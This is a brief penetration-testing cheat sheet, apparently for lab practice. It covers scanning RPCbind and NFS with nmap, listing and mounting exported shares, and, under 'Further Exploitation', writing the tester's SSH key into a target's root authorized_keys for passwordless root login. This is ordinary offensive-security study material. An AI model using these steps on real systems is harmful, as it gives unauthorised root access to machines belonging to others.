## Nmap Scan on RPCbind and NFS

```
nmap -v -p 111 10.11.1.1-254

nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254

nmap -p 111 --script nfs* 10.11.1.72
```
# Identifying if NFS is in use

```
rpcinfo -p 10.10.10.3

# If you get 111 and 2049 listed , shares are enable and we can mount them
```

## Show all mounts

```
showmount -e 10.10.10.3
```

## Mount a NFS share

```
mkdir /mnt/nfs
```

```
mount -t nfs $ip:/share /mnt/nfs
```

## Unmounting the shares

```
umount -f -l /mnt/nfs
# -f – Force unmount (in case of an unreachable NFS system).
# -l – Lazy unmount. Detach the filesystem from the filesystem hierarchy now, and cleanup all references to the filesystem as soon as it is not busy anymore.
```

# Further Exploitation

**If you can write to the remote hosts, try to put ssh key there** so that we can get remote ssh without password

```
ssh keygen
# Generating ssh keys

cat ~/.ssh/id_rsa.pub >> /mnt/nfs/root/.ssh/authorized_keys
# Putting it to remote host

ssh root@$ip
# Now can login without password on target
```
